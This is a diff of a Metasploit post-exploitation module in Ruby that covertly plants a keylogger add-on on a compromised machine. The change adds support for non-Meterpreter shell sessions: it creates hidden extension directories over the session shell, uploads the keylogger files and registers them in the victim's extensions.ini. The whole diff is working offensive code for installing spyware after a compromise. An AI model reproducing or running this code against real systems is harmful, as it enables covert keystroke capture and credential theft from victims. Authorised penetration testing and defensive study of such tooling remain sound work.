@@ -213,8 +213,8 @@ class Metasploit3 < Msf::Post
 	def upload_addon(paths)
         lpath = ::File.join(Msf::Config.install_root, "data", "post","keylogger")
 		paths.each do |path|
+            print_status("Planting to #{path}") 
             if session.type=="meterpreter"    
-                print_status("Planting to #{path}") 
                 extpath=path+ "\\extensions"
     
                 begin
@@ -240,13 +240,41 @@ class Metasploit3 < Msf::Post
                 end
             end
             if session.type != "meterpreter"
-                print_error("[TODO] Implement directory creation in non-meterpreter sessions")
+                extpath=path+"/extensions"
+                begin
+                    session.shell_command("mkdir #{extpath}")
+                rescue
+                    print_status("Extensions directory already exists")
+                end
+
+                extpath=extpath+"/asdf@asdf" # TODO randomize
+                
+                begin
+                    session.shell_command("mkdir #{extpath}")
+                rescue
+                end
+                
+                for direntry in Dir[lpath+'/**/'].sort{|a,b| a.split(/\//).size <=> b.split(/\//).size}
+                    begin
+                        direntry=direntry[lpath.size..direntry.size]
+                        print_status("Creating #{extpath+direntry}")
+                        session.shell_command("mkdir #{extpath+direntry}")
+                    rescue
+                        print_error("Could not create #{direntry}")
+                    end
+                end
+
             end
 
             for entry in Dir[lpath+'/**/*']
                 begin
                     entry=entry[lpath.size..entry.size]
-                    remote_entry=entry.gsub("/","\\")
+                    if @platform == :windows
+                        remote_entry=entry.gsub("/","\\")
+                    else
+                        remote_entry=entry
+                    end
+
                     print_status("Uploading #{::File.join(lpath,entry)} to #{extpath+remote_entry}");
                     write_file(extpath+remote_entry,get_file_as_string(::File.join(lpath,entry)))
                 rescue 
@@ -254,8 +282,15 @@ class Metasploit3 < Msf::Post
                 end
             end
 
-            print_status("Registering extension #{path}\\extensions.ini")
-            append_file(path+"\\extensions.ini","\nExtensionASDF="+extpath+"\n") # TODO randomize
+
+            if @platform == :windows
+                slash="\\"
+            else
+                slash="/"
+            end
+            print_status("Registering extension in #{path+slash}extensions.ini")
+
+            append_file(path+slash+"extensions.ini","\nExtensionASDF="+extpath+"\n") # TODO randomize
         end  
 	end
 
